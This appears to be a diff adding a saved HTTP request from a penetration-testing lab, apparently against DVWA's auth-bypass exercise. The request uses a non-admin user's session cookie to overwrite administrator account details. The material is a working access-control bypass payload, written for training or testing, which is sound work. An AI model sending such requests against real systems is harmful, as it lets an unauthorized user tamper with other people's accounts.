@@ -1,0 +1,6 @@
+POST /vulnerabilities/authbypass/change_user_details.php HTTP/1.1
+Host: 10.31.0.87:3000
+Cookie: PHPSESSID=668114fe6ed84d23e36a83697af2ebbf; security=low  (gordonb session, NOT admin)
+Content-Type: application/json
+
+{"id":1,"first_name":"PWNBYGOR","surname":"x"}
